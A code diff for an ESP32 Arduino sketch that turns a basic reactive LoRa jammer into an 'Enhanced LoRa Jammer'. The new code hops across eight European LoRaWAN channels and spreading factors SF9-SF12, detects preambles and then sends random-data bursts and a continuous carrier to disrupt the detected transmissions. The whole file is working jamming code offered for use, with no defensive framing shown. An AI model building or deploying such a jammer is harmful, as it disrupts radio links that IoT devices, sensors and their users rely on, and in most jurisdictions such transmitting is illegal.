@@ -1,76 +1,127 @@
 #include <RadioLib.h>
 
-#define LORA_SCK        05
-#define LORA_MISO       19
-#define LORA_MOSI       27
-#define LORA_SS         18
-#define LORA_DIO0       26
-#define LORA_DIO1       33
-#define LORA_RST        14
+#define LORA_SCK 05
+#define LORA_MISO 19
+#define LORA_MOSI 27
+#define LORA_SS 18
+#define LORA_DIO0 26
+#define LORA_DIO1 33
+#define LORA_RST 14
 
-float frequency =       867.1;
-int SF = 9;
+#define DEFAULT_JAMMING 0
+#define DYNAMIC_JAMMING 1
+
+#define JAMMING_STRATEGY DEFAULT_JAMMING
+
+// Enhanced jammer with better coverage
+float frequencies[] = {867.1, 867.3, 867.5, 867.7, 867.9, 868.1, 868.3, 868.5}; // All european channels
+int currentFreqIndex = 0;
+int spreadingFactors[] = {9, 10, 11, 12}; // Ignore 7 and 8
+int currentSFIndex = 0;
 
 SX1276 radio = new Module(LORA_SS, LORA_DIO0, LORA_RST, LORA_DIO1);
 
-void setup() {
+void setup()
+{
   Serial.begin(115200);
   delay(2000);
-  // Setup SX1276 wiring to ESP32
+
   SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_SS);
-
-  // Get SPI clock divider
-  uint32_t clockDiv = SPI.getClockDivider();
-    
-    // ESP32 APB clock is 80 MHz, so SPI speed is:
-  uint32_t spiSpeed = 80000000 / clockDiv;
-
-  Serial.print("Estimated Default SPI Frequency: ");
-  Serial.print(spiSpeed);
-  Serial.println(" Hz");
-  SPI.setFrequency(1000000);  // Lower SPI to 1 MHz
-
+  SPI.setFrequency(1000000); // 1 MHz SPI speed
 
   int state = radio.begin();
-  if (state != RADIOLIB_ERR_NONE) {
-    while (true);
-  } 
-  
+  if (state != RADIOLIB_ERR_NONE)
+  {
+    Serial.println("Radio initialization failed!");
+    while (true)
+      ;
+  }
 
+  // Configure radio parameters to match RN2483 defaults
   radio.setPreambleLength(8);
   radio.setOutputPower(17);
-  radio.setBandwidth(125.0);
-  radio.setCodingRate(5);
-  radio.setSpreadingFactor(SF);
-  radio.setSyncWord(34);
+  radio.setBandwidth(125.0); // 125 kHz bandwidth
+  radio.setCodingRate(5);    // 4/5 coding rate
+  radio.setSyncWord(34);     // LoRaWAN public sync word
   radio.setGain(1);
 
-  delay(100);
+  Serial.println("Enhanced LoRa Jammer Started");
+  Serial.println("Frequencies: 867.1-868.5 MHz");
+  Serial.println("Spreading Factors: SF9-SF12");
 }
 
-void loop() {
-  if (radio.scanChannel() == RADIOLIB_PREAMBLE_DETECTED) {
-    Serial.println("Preamble detected");
-    Serial.println(frequency);
-    Serial.print("SF: ");
-    Serial.println(SF);
-    // byte dummy[60] = {0};  // Longer payload → longer airtime
-    // radio.transmit(dummy, sizeof(dummy));
+void loop()
+{
+  // Set current frequency and SF
+  float currentFreq = frequencies[currentFreqIndex];
+  int currentSF = spreadingFactors[currentSFIndex];
 
-    radio.transmit("");
-    delay(100);
-    Serial.println("Radio transmitting");
-    Serial.println("__________________");
+  radio.setFrequency(currentFreq);
+  radio.setSpreadingFactor(currentSF);
+
+  // Perform channel activity detection first
+  bool channelActive = false;
+
+  // Quick listen before jamming
+  int listenResult = radio.scanChannel();
+  if (listenResult == RADIOLIB_PREAMBLE_DETECTED)
+  {
+    channelActive = true;
+    Serial.print("Activity detected on ");
+    Serial.print(currentFreq);
+    Serial.print(" MHz, SF");
+    Serial.println(currentSF);
   }
-  frequency = frequency + 0.2;
-  if (frequency > 868.5) {
-    SF++;
-    if (SF > 12) {
-      SF = 9;
+
+  // Jam the channel if active
+  if (channelActive)
+  {
+    Serial.print("Jamming ");
+    Serial.print(currentFreq);
+    Serial.print(" MHz, SF");
+    Serial.print(currentSF);
+    Serial.println();
+
+    // Create interference patterns
+    for (int burst = 0; burst < 3; burst++)
+    {
+      // Send continuous jamming packets
+      byte jammingPayload[60];
+
+      // Pattern 1: Random data
+      for (int i = 0; i < 60; i++)
+      {
+        jammingPayload[i] = random(0, 255);
+      }
+
+      int result = radio.transmit(jammingPayload, 60);
+      if (result == RADIOLIB_ERR_NONE)
+      {
+        Serial.print("Jam burst ");
+        Serial.print(burst + 1);
+        Serial.println(" sent");
+      }
+
+      delay(random(50, 200)); // Variable delay between bursts
     }
-    radio.setSpreadingFactor(SF);
-    frequency = 867.1;
-  }
-  radio.setFrequency(frequency);
 
+    // Pattern 2: Continuous carrier (brief)
+    radio.transmitDirect();
+    delay(100);
+    radio.standby();
+
+    Serial.println("Jamming burst complete");
+    delay(random(100, 500));
+  }
+
+  // Move to next frequency/SF combination
+  currentFreqIndex = (currentFreqIndex + 1) % (sizeof(frequencies) / sizeof(frequencies[0]));
+
+  if (currentFreqIndex == 0 && JAMMING_STRATEGY == DYNAMIC_JAMMING)
+  {
+    currentSFIndex = (currentSFIndex + 1) % (sizeof(spreadingFactors) / sizeof(spreadingFactors[0]));
+  }
+
+  // Random timing to be unpredictable (however may be less effective)
+  // delay(random(200, 800));
 }
